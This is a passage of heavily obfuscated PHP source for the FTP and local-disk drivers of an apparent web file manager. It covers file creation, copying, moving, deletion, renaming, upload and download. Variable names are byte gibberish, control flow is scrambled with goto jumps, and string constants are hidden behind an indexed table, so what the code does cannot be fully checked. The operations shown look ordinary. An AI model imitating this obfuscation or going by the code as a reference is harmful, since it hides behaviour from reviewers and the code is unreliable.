array($F‡”öÂÈÕ›[1149] => $this->connect, $F‡”öÂÈÕ›[165] => $this->host, $F‡”öÂÈÕ›[164] => $this->scheme, $F‡”öÂÈÕ›[166] => $this->port); goto bß¼ê©Ï—Ê; fæ©îÆ½«…: } private function _isconn() { return is_resource($this->connect); } public function mkfile($B÷´ÂÙ­Êà, $A­ë‰­‡òÌ = '', $cç¸Ä¡¾Õ = REPEAT_RENAME) { if ($this->setContent($B÷´ÂÙ­Êà, $A­ë‰­‡òÌ)) { return $this->getPathOuter($B÷´ÂÙ­Êà); } return !1; } public function mkdir($dÄÈ®ë„·®, $b„‚÷İ¡ŠÔ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $dÄÈ®ë„·® = $this->iconvSystem($dÄÈ®ë„·®); if ($this->isFolder($dÄÈ®ë„·®) || @ftp_mkdir($this->connect, $dÄÈ®ë„·®)) { return $this->getPathOuter($dÄÈ®ë„·®); } if (!$this->mkdir($this->pathFather($dÄÈ®ë„·®))) { return !1; } if ($dÄÈ®ë„·® = @ftp_mkdir($this->connect, $dÄÈ®ë„·®)) { return $this->getPathOuter($dÄÈ®ë„·®); } return !1; } public function copyFile($bˆ ø¹È†›, $dÅË‹Ê³) { goto D¹â¦õ·âÃ; cñêãÈÇ²: $this->tempFileRemve($AÄóÌâÁÇá); return $DÊ¹ö—Äõ; goto CÒÅåë§ÓŒ; D¹â¦õ·âÃ: if (!$this->_isconn()) { return !1; } $a¶±¦¡ãÈ» = $this->pathThis($this->iconvSystem($bˆ ø¹È†›)); $AÄóÌâÁÇá = $this->tempFile($a¶±¦¡ãÈ»); goto DÛ…òŞœ´; DÛ…òŞœ´: $AÖĞÃçóÜš = $this->iconvApp($AÄóÌâÁÇá); $this->download($bˆ ø¹È†›, $AÖĞÃçóÜš); $DÊ¹ö—Äõ = $this->upload($dÅË‹Ê³, $AÖĞÃçóÜš); goto cñêãÈÇ²; CÒÅåë§ÓŒ: } public function moveFile($AÃš‹µÊÊù, $dÕáæ¡× ) { if (!$this->_isconn()) { return !1; } $AÃš‹µÊÊù = $this->iconvSystem($AÃš‹µÊÊù); $dÕáæ¡×  = $this->iconvSystem($dÕáæ¡× ); $e±Ï¨ŠãŒ = @ftp_rename($this->connect, $AÃš‹µÊÊù, $dÕáæ¡× ); return $e±Ï¨ŠãŒ ? $this->getPathOuter($dÕáæ¡× ) : !1; } public function delFile($E­ÈÈ„Å×Ğ) { if (!$this->_isconn()) { return !1; } $E­ÈÈ„Å×Ğ = $this->iconvSystem($E­ÈÈ„Å×Ğ); return @ftp_delete($this->connect, $E­ÈÈ„Å×Ğ); } public function delFolder($aéÚÚèï÷Ì) { if (!$this->_isconn()) { return !1; } $aéÚÚèï÷Ì = $this->iconvSystem($aéÚÚèï÷Ì); $bïìŞô¼Á¾ = $this->ftpList($aéÚÚèï÷Ì); if (!$bïìŞô¼Á¾) { return @ftp_rmdir($this->connect, $aéÚÚèï÷Ì); } foreach ($bïìŞô¼Á¾ as $fÓÃ¦ßÍ†) { if ($this->isFolder($fÓÃ¦ßÍ†)) { $fÓÃ¦ßÍ† = $this->iconvApp($fÓÃ¦ßÍ†); $this->delFolder($fÓÃ¦ßÍ†); } else { @ftp_delete($this->connect, $fÓÃ¦ßÍ†); } } return @ftp_rmdir($this->connect, $aéÚÚèï÷Ì); } public function rename($b¹ÈÍ¹ÍŞ, $A‰È×‘Ã’µ) { goto Eö‘É»ù¥Œ; Dö‡‰ÂÒ‚§: return $Fà»ÄÂÚÕ ? $this->getPathOuter($eæ±©Û‚½) : !1; goto fÈ­Ò´¥”¢; a‘¼¸’«ëŠ: $DÇôÉ”Í‡¸ = $this->iconvSystem($DÇôÉ”Í‡¸); $b¹ÈÍ¹ÍŞ = $this->iconvSystem($b¹ÈÍ¹ÍŞ); $f¸¤è¸†Ú = $this->pathFather($b¹ÈÍ¹ÍŞ); goto cŒÍİ¢; Eö‘É»ù¥Œ: $aÆ¸óÖ÷¨’ =& $_SERVER[Ìó]; if (!$this->_isconn()) { return !1; } $DÇôÉ”Í‡¸ = $this->fileNameAuto($this->pathFather($b¹ÈÍ¹ÍŞ), $A‰È×‘Ã’µ); goto a‘¼¸’«ëŠ; cŒÍİ¢: $eæ±©Û‚½ = rtrim($f¸¤è¸†Ú, $aÆ¸óÖ÷¨’[8]) . $aÆ¸óÖ÷¨’[8] . $DÇôÉ”Í‡¸; $Fà»ÄÂÚÕ = @ftp_rename($this->connect, $b¹ÈÍ¹ÍŞ, $eæ±©Û‚½); $eæ±©Û‚½ = $this->iconvApp($eæ±©Û‚½); goto Dö‡‰ÂÒ‚§; fÈ­Ò´¥”¢: } private function folderInfo($A¼™–åÛ÷ä, $bñ©Ç¶“¨¿ = false) { goto F¦Šª”®Ü†; f³šĞÆÀŞ…: $bØØ‘ˆµƒ¶ = $this->iconvSystem($A¼™–åÛ÷ä); if ($bñ©Ç¶“¨¿) { return array($A…Š°óŒª¾[28] => $D®ìÖªÖÚ, $A…Š°óŒª¾[75] => $cñ‡Ğ³¾ÇÖ, $A…Š°óŒª¾[29] => $A…Š°óŒª¾[76]); } $CøÌ§ˆŠíô = array($A…Š°óŒª¾[28] => $D®ìÖªÖÚ, $A…Š°óŒª¾[75] => $cñ‡Ğ³¾ÇÖ, $A…Š°óŒª¾[29] => $A…Š°óŒª¾[76], $A…Š°óŒª¾[183] => 0, $A…Š°óŒª¾[106] => 0, $A…Š°óŒª¾[1150] => !0, $A…Š°óŒª¾[1151] => !0); goto C›Î†‘„Ìô; C›Î†‘„Ìô: return $CøÌ§ˆŠíô; goto CÁ£Òİ®Ø; F¦Šª”®Ü†: $A…Š°óŒª¾ =& $_SERVER[Ìó]; $cñ‡Ğ³¾ÇÖ = $this->getPathOuter(rtrim($A¼™–åÛ÷ä, $A…Š°óŒª¾[8])); $D®ìÖªÖÚ = $this->pathThis($cñ‡Ğ³¾ÇÖ); goto f³šĞÆÀŞ…; CÁ£Òİ®Ø: } private function fileInfo($C‘ß£ë†ºò, $E®«ª¤Æ–â = false) { goto bŠ¨Ë”‹£é; bŠ¨Ë”‹£é: $E¦…ºŒÎ÷ =& $_SERVER[Ìó]; $F×‘Ìì¯œ¬ = $this->getPathOuter(rtrim($C‘ß£ë†ºò, $E¦…ºŒÎ÷[8])); $cÓø¹ÏÂ‚ = $this->pathThis($F×‘Ìì¯œ¬); goto eØ¼ÜÙ¦Ô»; eØ¼ÜÙ¦Ô»: $A±ÛïÎõ¤Š = $this->iconvSystem($C‘ß£ë†ºò); if ($E®«ª¤Æ–â) { return array($E¦…ºŒÎ÷[28] => $cÓø¹ÏÂ‚, $E¦…ºŒÎ÷[75] => $F×‘Ìì¯œ¬, $E¦…ºŒÎ÷[29] => $E¦…ºŒÎ÷[163], $E¦…ºŒÎ÷[156] => $this->ext($C‘ß£ë†ºò), $E¦…ºŒÎ÷[77] => $this->size($C‘ß£ë†ºò)); } $eîáÛ„¿£ = array($E¦…ºŒÎ÷[28] => $cÓø¹ÏÂ‚, $E¦…ºŒÎ÷[75] => $F×‘Ìì¯œ¬, $E¦…ºŒÎ÷[29] => $E¦…ºŒÎ÷[163], $E¦…ºŒÎ÷[183] => 0, $E¦…ºŒÎ÷[106] => @ftp_mdtm($this->connect, $A±ÛïÎõ¤Š), $E¦…ºŒÎ÷[156] => $this->ext($C‘ß£ë†ºò), $E¦…ºŒÎ÷[77] => $this->size($C‘ß£ë†ºò), $E¦…ºŒÎ÷[1150] => !0, $E¦…ºŒÎ÷[1151] => !0); goto E¯í“ÙÕËƒ; E¯í“ÙÕËƒ: $eîáÛ„¿£[$E¦…ºŒÎ÷[106]] = $eîáÛ„¿£[$E¦…ºŒÎ÷[106]] > 0 ? $eîáÛ„¿£[$E¦…ºŒÎ÷[106]] : 0; return $eîáÛ„¿£; goto dÉë—•ÃÕ; dÉë—•ÃÕ: } public function size($E¡À‰²‡) { $cªìÒöí = $this->objectMeta($E¡À‰²‡); return $cªìÒöí ? $cªìÒöí[$_SERVER[Ìó][77]] : 0; } public function info($dßƒÒÙĞ¿Ğ) { if ($this->isFile($dßƒÒÙĞ¿Ğ)) { return $this->fileInfo($dßƒÒÙĞ¿Ğ, 0); } else { if ($this->isFolder($dßƒÒÙĞ¿Ğ)) { return $this->folderInfo($dßƒÒÙĞ¿Ğ); } } return !1; } public function exist($aîö—êóª„) { return $this->objectMeta($aîö—êóª„) ? !0 : !1; } public function isFile($Dğó‘Í®Æ¤) { $fÄ‹ÏÁš§’ =& $_SERVER[Ìó]; $bË‡Œ†¬òõ = $this->objectMeta($Dğó‘Í®Æ¤); return $bË‡Œ†¬òõ ? $bË‡Œ†¬òõ[$fÄ‹ÏÁš§’[29]] == $fÄ‹ÏÁš§’[163] : !1; } public function isFolder($d•Œò©ÛÀÒ) { $a™—“¦Òµ­ =& $_SERVER[Ìó]; $C­ç‹…µƒ• = $this->objectMeta($d•Œò©ÛÀÒ); return $C­ç‹…µƒ• ? $C­ç‹…µƒ•[$a™—“¦Òµ­[29]] == $a™—“¦Òµ­[76] : !1; } public function listPath($eì­Â¬ĞÆâ, $Aƒèù®ëØ = false) { goto Cƒºç‡‚¡á; Eá„³´ù×ï: foreach ($AÃù’Ì‹â’ as $eì­Â¬ĞÆâ) { if ($this->isFolder($eì­Â¬ĞÆâ)) { $D¡±Ãö ‚á[$d±…™»[74]][] = $this->folderInfo($eì­Â¬ĞÆâ, $Aƒèù®ëØ); } else { $D¡±Ãö ‚á[$d±…™»[73]][] = $this->fileInfo($eì­Â¬ĞÆâ, $Aƒèù®ëØ); } } return $D¡±Ãö ‚á; goto FÌÆº„ˆ»Á; bˆ²÷Õ†“é: $AÃù’Ì‹â’ = $this->ftpList($eì­Â¬ĞÆâ); $D¡±Ãö ‚á = array($d±…™»[74] => array(), $d±…™»[73] => array()); if (!$AÃù’Ì‹â’) { return $D¡±Ãö ‚á; } goto Eá„³´ù×ï; Cƒºç‡‚¡á: $d±…™» =& $_SERVER[Ìó]; if (!$this->_isconn()) { return !1; } $eì­Â¬ĞÆâ = $this->iconvSystem($eì­Â¬ĞÆâ); goto bˆ²÷Õ†“é; FÌÆº„ˆ»Á: } public function has($AòÆœ˜†ÚÅ, $eôÍŞ˜ñƒ = false, $a¿œïÅŞî = true) { goto AäÕÙÒçí; e‰À·áà“ç: foreach ($AÙá¿Ê†Ü as $AòÆœ˜†ÚÅ) { if ($a¿œïÅŞî) { if (!$this->isFolder($AòÆœ˜†ÚÅ)) { return !0; } } else { if ($this->isFolder($AòÆœ˜†ÚÅ)) { return !0; } } } return !1; goto BÚù¦ÆÊ‘; C¦™ÇÙÖ¨ï: $AÙá¿Ê†Ü = $this->ftpList($AòÆœ˜†ÚÅ); if (!$AÙá¿Ê†Ü) { return !1; } if ($eôÍŞ˜ñƒ) { return array($Bà¸Ïãóİ†[187] => 0, $Bà¸Ïãóİ†[188] => count($AÙá¿Ê†Ü)); } goto e‰À·áà“ç; AäÕÙÒçí: $Bà¸Ïãóİ† =& $_SERVER[Ìó]; if (!$this->_isconn()) { return !1; } $AòÆœ˜†ÚÅ = $this->iconvSystem($AòÆœ˜†ÚÅ); goto C¦™ÇÙÖ¨ï; BÚù¦ÆÊ‘: } public function listAll($c‹ƒŸïŒ¼æ) { goto E¤ù¥Ï§‰; E¤ù¥Ï§‰: $c˜ä£Š§Œš =& $_SERVER[Ìó]; if (!$this->_isconn()) { return !1; } $c‹ƒŸïŒ¼æ = $this->iconvSystem($c‹ƒŸïŒ¼æ); goto fÎÓ‹‰Äá°; fÎÓ‹‰Äá°: $F·Èßğï³Ù = array($c˜ä£Š§Œš[73] => array(), $c˜ä£Š§Œš[74] => array()); $this->recursionFtpFiles($c‹ƒŸïŒ¼æ, $F·Èßğï³Ù); $a—õ•çÇàÛ = array(); goto eô•É°áœ; eô•É°áœ: foreach ($F·Èßğï³Ù[$c˜ä£Š§Œš[74]] as $FÑ×²Œ÷çµ) { $a—õ•çÇàÛ[] = array($c˜ä£Š§Œš[75] => $c˜ä£Š§Œš[8] . trim(str_replace($c‹ƒŸïŒ¼æ, $c˜ä£Š§Œš[33], $FÑ×²Œ÷çµ), $c˜ä£Š§Œš[8]) . $c˜ä£Š§Œš[8], $c˜ä£Š§Œš[76] => 1, $c˜ä£Š§Œš[77] => 0); } foreach ($F·Èßğï³Ù[$c˜ä£Š§Œš[73]] as $fÊÛ×ØöÚ¬) { $a—õ•çÇàÛ[] = array($c˜ä£Š§Œš[75] => $c˜ä£Š§Œš[8] . trim(str_replace($c‹ƒŸïŒ¼æ, $c˜ä£Š§Œš[33], $fÊÛ×ØöÚ¬), $c˜ä£Š§Œš[8]), $c˜ä£Š§Œš[76] => 0, $c˜ä£Š§Œš[77] => $this->size($fÊÛ×ØöÚ¬)); } return $a—õ•çÇàÛ; goto eà‡§ˆ¶¹Ã; eà‡§ˆ¶¹Ã: } public function getContent($f ¹ éÕã) { if (!$this->_isconn()) { return !1; } $f ¹ éÕã = $this->iconvSystem($f ¹ éÕã); return $this->fileSubstr($f ¹ éÕã); } public function setContent($Bó™Û¥ğ, $aŠÂì‡Ô = '') { goto EÚŠÈ—«®; AÕ§…Î«Ä¢: return $DëçœµÇÕ; goto BÊãâÊß; EÚŠÈ—«®: if (!$this->_isconn()) { return !1; } $bÅÑÁá‘ = $this->pathThis($this->iconvSystem($Bó™Û¥ğ)); $D¾‘¸¹…×È = $this->tempFile($bÅÑÁá‘); goto f¢Í¹õğµÄ; f¢Í¹õğµÄ: file_put_contents($D¾‘¸¹…×È, $aŠÂì‡Ô); $DëçœµÇÕ = $this->upload($Bó™Û¥ğ, $this->iconvApp($D¾‘¸¹…×È)); $this->tempFileRemve($D¾‘¸¹…×È); goto AÕ§…Î«Ä¢; BÊãâÊß: } public function fileSubstr($c¡ï­õ±Ø‡, $F¥ç‹™¨è = 0, $CãÄ­˜‰ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($c¡ï­õ±Ø‡, $F¥ç‹™¨è, $CãÄ­˜‰); } private function ftpRequest($bõÕÇõ¶™É, $aò„Ä¼£öá = 0, $D”ªŸÓˆóˆ = false) { goto AÓÊ§ªä¦; dâßÇ«£¸–: curl_setopt($c±†Í„²ˆ, CURLOPT_URL, $c›ğ¬ìï‰÷ . $this->pathEncode($bõÕÇõ¶™É)); curl_setopt($c±†Í„²ˆ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($D”ªŸÓˆóˆ) { $Fô—ºÉ¬ = $aò„Ä¼£öá + $D”ªŸÓˆóˆ - 1; curl_setopt($c±†Í„²ˆ, CURLOPT_RANGE, "{$aò„Ä¼£öá}\x2d{$Fô—ºÉ¬}"); } goto F±›ÃÊÅÑ¹; AÓÊ§ªä¦: $bõÕÇõ¶™É = $this->iconvSystem($bõÕÇõ¶™É); $c›ğ¬ìï‰÷ = $this->scheme . $this->host . $_SERVER[Ìó][4] . $this->port; $c±†Í„²ˆ = curl_init(); goto dâßÇ«£¸–; F±›ÃÊÅÑ¹: curl_setopt($c±†Í„²ˆ, CURLOPT_RETURNTRANSFER, 1); $B³êßÑ¹À = curl_exec($c±†Í„²ˆ); curl_close($c±†Í„²ˆ); goto dàÜŞƒ†; dàÜŞƒ†: return $B³êßÑ¹À; goto C²ÏÑÆ‹‚; C²ÏÑÆ‹‚: } public function upload($bÖ’¬åäÄ‘, $CĞ´»ÀÜ—¬, $då‘¬¦Ô…° = false, $EªËÁ¸ğè = REPEAT_REPLACE) { goto CóÄÚÕÌæÍ; f·»Ÿ¦õî: if ($d§ˆŠ½Ú§ != FTP_FINISHED) { return !1; } return $this->getPathOuter($bÖ’¬åäÄ‘); goto Eö—í¢Æ”; CóÄÚÕÌæÍ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($bÖ’¬åäÄ‘))) { return !1; } $bÖ’¬åäÄ‘ = $this->iconvSystem($bÖ’¬åäÄ‘); goto AÁ³îÂÁ†Œ; AÁ³îÂÁ†Œ: $CĞ´»ÀÜ—¬ = $this->iconvSystem($CĞ´»ÀÜ—¬); $d§ˆŠ½Ú§ = ftp_nb_put($this->connect, $bÖ’¬åäÄ‘, $CĞ´»ÀÜ—¬, FTP_BINARY); while ($d§ˆŠ½Ú§ == FTP_MOREDATA) { $d§ˆŠ½Ú§ = ftp_nb_continue($this->connect); } goto f·»Ÿ¦õî; Eö—í¢Æ”: } public function download($eø°‰‹äëİ, $F¼ÑàÉæ¤ = '') { goto e¹Ó‹¿ °ê; C„˜ÇŞ˜ô: $eø°‰‹äëİ = $this->iconvSystem($eø°‰‹äëİ); $F¼ÑàÉæ¤ = $this->iconvSystem($F¼ÑàÉæ¤); $E‘µòì¬¦… = ftp_nb_get($this->connect, $F¼ÑàÉæ¤, $eø°‰‹äëİ, FTP_BINARY); goto cìó×‚˜Øá; cìó×‚˜Øá: while ($E‘µòì¬¦… == FTP_MOREDATA) { $E‘µòì¬¦… = ftp_nb_continue($this->connect); } if ($E‘µòì¬¦… != FTP_FINISHED) { return !1; } return $this->iconvApp($F¼ÑàÉæ¤); goto bÑ—Ø¨‚ùò; e¹Ó‹¿ °ê: if (!$this->_isconn()) { return !1; } $D¬šÆ‹¼‡µ = $this->pathFather($F¼ÑàÉæ¤); if (!IO::mkdir($D¬šÆ‹¼‡µ)) { return !1; } goto C„˜ÇŞ˜ô; bÑ—Ø¨‚ùò: } private function ftpList($c‚‡‚••ó¢) { goto A‡Š÷²ÇÖ; d³¥³ƒä•Ì: $c‚‡‚••ó¢ = rtrim($c‚‡‚••ó¢, $b®â­‘â‹ù[8]) . $b®â­‘â‹ù[8]; $aÚÒò»ˆÙÆ = @ftp_nlist($this->connect, $c‚‡‚••ó¢); if ($aÚÒò»ˆÙÆ === !1) { $aÚÒò»ˆÙÆ = @ftp_rawlist($this->connect, $c‚‡‚••ó¢); foreach ($aÚÒò»ˆÙÆ as $c¿¸¯áè²ø => $E¨ªë) { $aÚÒò»ˆÙÆ[$c¿¸¯áè²ø] = end(explode($b®â­‘â‹ù[1152], $E¨ªë)); } } goto CØ’Œ¬© í; A‡Š÷²ÇÖ: $b®â­‘â‹ù =& $_SERVER[Ìó]; if (!$this->isFolder($c‚‡‚••ó¢)) { return !1; } @ftp_chdir($this->connect, $b®â­‘â‹ù[8]); goto d³¥³ƒä•Ì; CØ’Œ¬© í: $c¢œîËÔ¾¯ = array(); foreach ($aÚÒò»ˆÙÆ as $b¼ÚÌ°¶Œå) { if ($b¼ÚÌ°¶Œå == $b®â­‘â‹ù[91] || $b¼ÚÌ°¶Œå == $b®â­‘â‹ù[1153]) { continue; } if (!strstr($b¼ÚÌ°¶Œå, $b®â­‘â‹ù[8])) { $b¼ÚÌ°¶Œå = $c‚‡‚••ó¢ . ltrim($b¼ÚÌ°¶Œå, $b®â­‘â‹ù[8]); } $c¢œîËÔ¾¯[] = $this->iconvApp($b¼ÚÌ°¶Œå); } return $c¢œîËÔ¾¯; goto AéÔËæ ™¿; AéÔËæ ™¿: } private function recursionFtpFiles($aòàÎÛóƒ, &$Cå’˜Ç´Å) { $Bõ±ˆ…„¥ =& $_SERVER[Ìó]; if (!$this->_isconn()) { return !1; } if (!($dŒ®¢Ö‹‡ = $this->ftpList($aòàÎÛóƒ))) { return !1; } foreach ($dŒ®¢Ö‹‡ as $aòàÎÛóƒ) { if ($this->isFolder($aòàÎÛóƒ)) { $this->recursionFtpFiles($aòàÎÛóƒ, $Cå’˜Ç´Å); $Cå’˜Ç´Å[$Bõ±ˆ…„¥[74]][] = $aòàÎÛóƒ; } else { $Cå’˜Ç´Å[$Bõ±ˆ…„¥[73]][] = $aòàÎÛóƒ; } } } private function objectMeta($bëŒ™î¢) { goto D—ÒÕ÷Ø; B¬¢Ÿ‰ï¹¸: return $C‡ç‘®¾Ü; goto e·••İìÉÕ; D—ÒÕ÷Ø: $eç¦×‹ùäÏ =& $_SERVER[Ìó]; $Fï„öÄë«— = $eç¦×‹ùäÏ[1154] . md5($bëŒ™î¢); $C‡ç‘®¾Ü = Cache::get($Fï„öÄë«—); goto bÌÓñáßçà; bê”‰ÍÚ¿Ú: $DÖ¾ã³èÛÅ = @ftp_size($this->connect, $this->iconvSystem($bëŒ™î¢)); if ($DÖ¾ã³èÛÅ != -1) { $C‡ç‘®¾Ü = array($eç¦×‹ùäÏ[77] => $DÖ¾ã³èÛÅ, $eç¦×‹ùäÏ[29] => $eç¦×‹ùäÏ[163]); } else { $cÃˆ¶éĞ¼ = @ftp_chdir($this->connect, $this->iconvSystem($bëŒ™î¢)); $C‡ç‘®¾Ü = $cÃˆ¶éĞ¼ ? array($eç¦×‹ùäÏ[77] => 0, $eç¦×‹ùäÏ[29] => $eç¦×‹ùäÏ[76]) : !1; } Cache::set($Fï„öÄë«—, $C‡ç‘®¾Ü, 0); goto B¬¢Ÿ‰ï¹¸; bÌÓñáßçà: if ($C‡ç‘®¾Ü !== null && $C‡ç‘®¾Ü !== !1) { return $C‡ç‘®¾Ü; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $eç¦×‹ùäÏ[8]); goto bê”‰ÍÚ¿Ú; e·••İìÉÕ: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($cíÅ Ó×Œ) { if (substr($cíÅ Ó×Œ, 0, 2) == $_SERVER[Ìó][1143]) { $cíÅ Ó×Œ = BASIC_PATH . substr($cíÅ Ó×Œ, 2); } return $cíÅ Ó×Œ; } public function iconvApp($eêŞ†œ¥›å) { $AØ¬ßíˆšÛ =& $_SERVER[Ìó]; global $config; return $this->iconvTo($eêŞ†œ¥›å, $config[$AØ¬ßíˆšÛ[1141]], $config[$AØ¬ßíˆšÛ[1140]]); } public function iconvSystem($b‰ßÔ„ãƒÎ) { $EË–¶œ˜‘ä =& $_SERVER[Ìó]; global $config; return $this->iconvTo($b‰ßÔ„ãƒÎ, $config[$EË–¶œ˜‘ä[1140]], $config[$EË–¶œ˜‘ä[1141]]); } public function getPathOuter($CÚ•æİùŠˆ) { goto DáÁ…±”¥; D¼Ìîù¸Ÿ’: return $this->pathDriver . $AÎºËÄèÚ­[8] . ltrim($CÚ•æİùŠˆ, $AÎºËÄèÚ­[8]); goto a¡‚•ğ¢òŞ; Få·ºíˆÆÌ: $CÚ•æİùŠˆ = KodIO::clear($CÚ•æİùŠˆ); $CÚ•æİùŠˆ = substr($CÚ•æİùŠˆ, strlen($b° ÏğÒ“)); if (empty($this->pathDriver)) { return $CÚ•æİùŠˆ; } goto D¼Ìîù¸Ÿ’; AßÌ·©òÂ£: if (substr($b° ÏğÒ“, 0, 2) == $AÎºËÄèÚ­[1143]) { $b° ÏğÒ“ = BASIC_PATH . substr($b° ÏğÒ“, 2); } if (substr($CÚ•æİùŠˆ, 0, 2) == $AÎºËÄèÚ­[1143]) { $CÚ•æİùŠˆ = BASIC_PATH . substr($CÚ•æİùŠˆ, 2); } $b° ÏğÒ“ = KodIO::clear($b° ÏğÒ“); goto Få·ºíˆÆÌ; DáÁ…±”¥: $AÎºËÄèÚ­ =& $_SERVER[Ìó]; $b° ÏğÒ“ = $this->iconvApp($this->pathBase); $CÚ•æİùŠˆ = $this->iconvApp($CÚ•æİùŠˆ); goto AßÌ·©òÂ£; a¡‚•ğ¢òŞ: } public function mkfile($aËÊßÚ Ç„, $dÖ»Şø¸ = '', $DÅÙ‚¶˜Äà = REPEAT_RENAME) { $aËÊßÚ Ç„ = $this->iconvSystem($aËÊßÚ Ç„); @touch($aËÊßÚ Ç„); if ($dÖ»Şø¸) { file_put_contents($aËÊßÚ Ç„, $dÖ»Şø¸); } return is_file($aËÊßÚ Ç„) ? $this->getPathOuter($aËÊßÚ Ç„) : !1; } public function mkdir($bŞÁŒËŞ“—, $E¨Š‚¡èÖÈ = REPEAT_SKIP) { $bŞÁŒËŞ“— = $this->iconvSystem($bŞÁŒËŞ“—); if (is_dir($bŞÁŒËŞ“—)) { return $this->getPathOuter($bŞÁŒËŞ“—); } @mkdir($bŞÁŒËŞ“—, 511, !0); return is_dir($bŞÁŒËŞ“—) ? $this->getPathOuter($bŞÁŒËŞ“—) : !1; } public function copyFile($b­¤Ù¼ÒÓ‹, $A‘Ñ˜·àèÛ) { $this->mkdir($this->pathFather($A‘Ñ˜·àèÛ)); $b­¤Ù¼ÒÓ‹ = $this->iconvSystem($b­¤Ù¼ÒÓ‹); $A‘Ñ˜·àèÛ = $this->iconvSystem($A‘Ñ˜·àèÛ); $a•Ü»ğ¨ = @copy($b­¤Ù¼ÒÓ‹, $A‘Ñ˜·àèÛ); return $a•Ü»ğ¨ ? $this->getPathOuter($A‘Ñ˜·àèÛ) : !1; } public function moveFile($b¦ì‡Šğ°, $f¡ÏÄÈ©Î©) { $this->mkdir($this->pathFather($f¡ÏÄÈ©Î©)); $b¦ì‡Šğ° = $this->iconvSystem($b¦ì‡Šğ°); $f¡ÏÄÈ©Î© = $this->iconvSystem($f¡ÏÄÈ©Î©); $CÏÌáÃ°Ää = intval(@rename($b¦ì‡Šğ°, $f¡ÏÄÈ©Î©)); if (!$CÏÌáÃ°Ää) { if ($CÏÌáÃ°Ää = intval(@copy($b¦ì‡Šğ°, $f¡ÏÄÈ©Î©))) { @unlink($b¦ì‡Šğ°); } } return $CÏÌáÃ°Ää ? $this->getPathOuter($f¡ÏÄÈ©Î©) : !1; } public function delFile($D¹Ç„‚—ƒÁ) { $D¹Ç„‚—ƒÁ = $this->iconvSystem($D¹Ç„‚—ƒÁ); if (!@unlink($D¹Ç„‚—ƒÁ)) { @chmod($D¹Ç„‚—ƒÁ, 511); if (!@unlink($D¹Ç„‚—ƒÁ)) { return !1; } } else { return !0; } } public function delFolder($Còá¿ÍìÆ¼) { goto fíÉµœµç; fíÉµœµç: $BãƒĞÎÃ½Ü =& $_SERVER[Ìó]; $Còá¿ÍìÆ¼ = $this->iconvSystem($Còá¿ÍìÆ¼); if (!is_dir($Còá¿ÍìÆ¼)) { return !0; } goto CÀ‘ì”ÙŞÏ; a„½¿‘˜˜½: return rmdir($Còá¿ÍìÆ¼); goto d¨ïèÊÚà; CÀ‘ì”ÙŞÏ: if (!($fè›Íƒ¸” = opendir($Còá¿ÍìÆ¼))) { return !1; } while (($A“·±ÃÄ— = readdir($fè›Íƒ¸”)) !== !1) { if ($A“·±ÃÄ— == $BãƒĞÎÃ½Ü[91] || $A“·±ÃÄ— == $BãƒĞÎÃ½Ü[1153]) { continue; } $fœå…Í®Õ = $Còá¿ÍìÆ¼ . $BãƒĞÎÃ½Ü[8] . $A“·±ÃÄ—; if (!is_dir($fœå…Í®Õ)) { if (!unlink($fœå…Í®Õ)) { chmod($fœå…Í®Õ, 511); if (!unlink($fœå…Í®Õ)) { return !1; } } } else { chmod($fœå…Í®Õ, 511); $fœå…Í®Õ = $this->iconvApp($fœå…Í®Õ); if (!$this->delFolder($fœå…Í®Õ)) { return !1; } } } closedir($fè›Íƒ¸”); goto a„½¿‘˜˜½; d¨ïèÊÚà: } public function rename($DÜ©ÄË†øõ, $FŞ™ÁèÉ) { goto dµÙÇğ†éÚ; dµÙÇğ†éÚ: $Dç”‰¬ŞÖõ =& $_SERVER[Ìó]; $F£ìùõÌ¡Ú = $this->fileNameAuto($this->pathFather($DÜ©ÄË†øõ), $FŞ™ÁèÉ); $F£ìùõÌ¡Ú = $this->iconvSystem($F£ìùõÌ¡Ú); goto A—…Ò¦ÏÖ; CÉõ§ç”åÌ: $E´„ÎïŒ÷ = @rename($DÜ©ÄË†øõ, $AîŒ¥‹ë); $AîŒ¥‹ë = $this->iconvApp($AîŒ¥‹ë); return $E´„ÎïŒ÷ ? $this->getPathOuter($AîŒ¥‹ë) : !1; goto A¹ãóôÕ¸¶; A—…Ò¦ÏÖ: $DÜ©ÄË†øõ = $this->iconvSystem($DÜ©ÄË†øõ); $FæŠµ¯¸„„ = $this->pathFather($DÜ©ÄË†øõ); $AîŒ¥‹ë = rtrim($FæŠµ¯¸„„, $Dç”‰¬ŞÖõ[8]) . $Dç”‰¬ŞÖõ[8] . $F£ìùõÌ¡Ú; goto CÉõ§ç”åÌ; A¹ãóôÕ¸¶: } public function size($aŸæ¶³¼á¢) { $aŸæ¶³¼á¢ = $this->iconvSystem($aŸæ¶³¼á¢); return (double) abs(sprintf($_SERVER[Ìó][1155], @filesize($aŸæ¶³¼á¢))); } public function info($Fß£§æŞí) { $Fß£§æŞí = $this->iconvSystem($Fß£§æŞí); if ($this->isFolder($Fß£§æŞí)) { return $this->folderInfo($Fß£§æŞí); } else { if ($this->isFile($Fß£§æŞí)) { return $this->fileInfo($Fß£§æŞí); } } return !1; } protected function infoChildren($Dœ‰ìœß„¸, &$fê‰µ»±–, $D–ß¿ï¬±¤ = true) { $c ºÒ‚¬Åå =& $_SERVER[Ìó]; $Dœ‰ìœß„¸ = rtrim($Dœ‰ìœß„¸, $c ºÒ‚¬Åå[8]) . $c ºÒ‚¬Åå[8]; if ($D–ß¿ï¬±¤) { check_abort(); $Dœ‰ìœß„¸ = $this->iconvSystem($Dœ‰ìœß„¸); } if (!($bÔ ƒ¹ÜåÁ = @opendir($Dœ‰ìœß„¸))) { return; } while (($eˆæ¬ŒÌ = readdir($bÔ ƒ¹ÜåÁ)) !== !1) { if ($eˆæ¬ŒÌ == $c ºÒ‚¬Åå[91] || $eˆæ¬ŒÌ == $c ºÒ‚¬Åå[1153]) { continue; } $eÒÙøêŒŠ = $Dœ‰ìœß„¸ . $eˆæ¬ŒÌ; if (is_file($eÒÙøêŒŠ)) { $fê‰µ»±–[$c ºÒ‚¬Åå[78]]++; $fê‰µ»±–[$c ºÒ‚¬Åå[77]] += (double) abs(sprintf($c ºÒ‚¬Åå[1155], @filesize($eÒÙøêŒŠ))); } else { $fê‰µ»±–[$c 